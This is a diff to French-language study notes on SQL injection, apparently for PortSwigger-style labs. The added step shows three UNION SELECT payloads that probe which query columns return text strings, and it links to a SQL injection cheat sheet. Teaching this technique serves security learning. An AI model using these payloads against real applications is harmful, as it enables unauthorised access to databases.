@@ -66,7 +66,14 @@ etc.
 
 Cheat Sheet dispo ici pour les BDD spécifiques : https://portswigger.net/web-security/sql-injection/cheat-sheet
 
-  2) Déterminer les types de données et leurs compatibilités
+  2) Déterminer les types de données
 
-  
+Vérifier une par une les colonnes afin de vérifier s'il renvoient une chaîne de caractères :
 
+```
+'+UNION+SELECT+'a',NULL,NULL--
+'+UNION+SELECT+NULL,'a',NULL--
+'+UNION+SELECT+NULL,NULL,'a'--
+```
+
+Si nous n'avons aucune erreur dans certaines colonnes, alors nous pouvons récupérer des chaînes de caractères dans celles-ci.
